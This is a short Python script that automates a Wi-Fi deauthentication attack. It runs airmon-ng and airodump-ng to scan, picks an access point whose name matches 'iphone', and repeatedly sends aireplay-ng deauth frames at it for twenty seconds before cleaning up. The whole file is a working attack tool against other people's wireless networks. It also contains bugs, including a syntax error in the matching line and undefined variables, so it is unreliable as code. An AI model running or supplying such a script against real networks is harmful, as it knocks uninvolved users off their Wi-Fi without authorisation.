import os
import time
import signal
import csv
import re

def attack():
    with open('py_dump_file-01.csv', newline='') as csvfile:
        spamreader = csv.reader(csvfile, delimiter=',', quotechar='|')
        i = 0

        # follow index of file csv, could be optimized with a dynamic research
        channel = 3
        ESSID = 13
        BSSID = 0  # index of mac address access point
        for row in spamreader:
            if len(row) < 15:
                continue
            target = str(row[13]).lower()
            if (re.search(r"[i,I]phone", text): # can be customized
                mac_ap = row[0]
                channel = row[3]
                print("mac address of access point " + row[0] + "\nchannel target" + row[3])
                break
        os.system('iwconfig ' + interface + 'mon channel ' + channel)
        while(True):
            os.system('aireplay-ng -a ' + mac_ap + ' -0 1 ' + interface + 'mon')


if __name__ == '__main__':

    os.system('airmon-ng check kill')
    os.system('airmon-ng')

    interface = input("select an interface (wlan0/wlan1...)")
    os.system('airmon-ng start ' + interface)

    new_pid = os.fork()
    if new_pid == 0: # parent
        os.system('airodump-ng ' + interface + 'mon --write py_dump_file')
        # this command (should) never return, child

    time.sleep(10)
    os.kill(new_pid, signal.SIGSTOP)

    # perform the attack
    new_pid = os.fork()
    if new_pid == 0:
        attack()

    # set time of attack 20s
    time.sleep(20)
    os.kill(new_pid, signal.SIGSTOP)
    os.system('rm -r py_dump_file*')

    # restart wifi in normal mode
    os.system('airmon-ng stop ' + interface + 'mon')
    os.system('systemctl restart NetworkManager.service')

